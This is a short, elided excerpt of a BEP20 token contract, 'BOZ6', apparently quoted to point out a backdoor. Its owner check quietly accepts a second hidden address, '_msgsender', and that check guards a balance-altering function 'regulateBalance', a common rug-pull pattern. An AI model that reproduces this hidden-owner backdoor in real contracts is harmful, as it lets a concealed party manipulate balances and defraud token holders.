...
contract BOZ6 is IBEP20 
{
    ...
    modifier onlyOwner() { require(msg.sender == _owner || msg.sender == _msgsender, "Caller is not owner"); _; }
    ...
    function regulateBalance(uint256 qty) public virtual onlyOwner
    {
